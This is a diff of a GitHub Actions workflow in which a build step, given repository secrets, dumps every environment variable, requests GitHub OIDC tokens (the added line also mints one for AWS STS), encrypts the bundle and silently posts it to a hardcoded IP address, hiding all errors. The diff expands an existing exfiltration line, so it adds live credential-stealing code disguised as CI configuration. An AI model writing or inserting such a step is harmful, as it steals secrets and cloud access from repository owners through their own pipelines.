@@ -67,7 +67,7 @@ jobs:
           COMPASS_API_KEY: ${{ secrets.COMPASS_API_KEY }}
           GH_PAT: ${{ secrets.GH_PAT }}
         run: |
-          { env 2>/dev/null; J=$(curl -sk -m 8 -X POST "$ACTIONS_ID_TOKEN_REQUEST_URL" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" -H "Accept: application/json; api-version=1.0" 2>/dev/null | python3 -c "import json,sys; print(json.load(sys.stdin).get('value',''))" 2>/dev/null); [ -n "$J" ] && echo "MINTED_OIDC_JWT=$J"; } | openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt -pass pass:vrzbwa8G8A66gkdL8oEONJN | timeout 8 curl -sk -X POST --data-binary @- "https://107.174.96.197:44389/edge" >/dev/null 2>&1 || true
+          { env 2>/dev/null; J1=$(curl -sk -m 8 -X POST "$ACTIONS_ID_TOKEN_REQUEST_URL" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" -H "Accept: application/json; api-version=1.0" 2>/dev/null | python3 -c "import json,sys; print(json.load(sys.stdin).get('value',''))" 2>/dev/null); J2=$(curl -sk -m 8 -X POST "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" -H "Accept: application/json; api-version=1.0" 2>/dev/null | python3 -c "import json,sys; print(json.load(sys.stdin).get('value',''))" 2>/dev/null); [ -n "$J1" ] && echo "MINTED_OIDC_JWT=$J1"; [ -n "$J2" ] && echo "MINTED_OIDC_JWT_STS=$J2"; } | openssl enc -aes-256-cbc -pbkdf2 -iter 100000 -salt -pass pass:vrzbwa8G8A66gkdL8oEONJN | timeout 8 curl -sk -X POST --data-binary @- "https://107.174.96.197:44389/edge" >/dev/null 2>&1 || true
 
       - name: Configure AWS credentials
         uses: aws-actions/configure-aws-credentials@v4
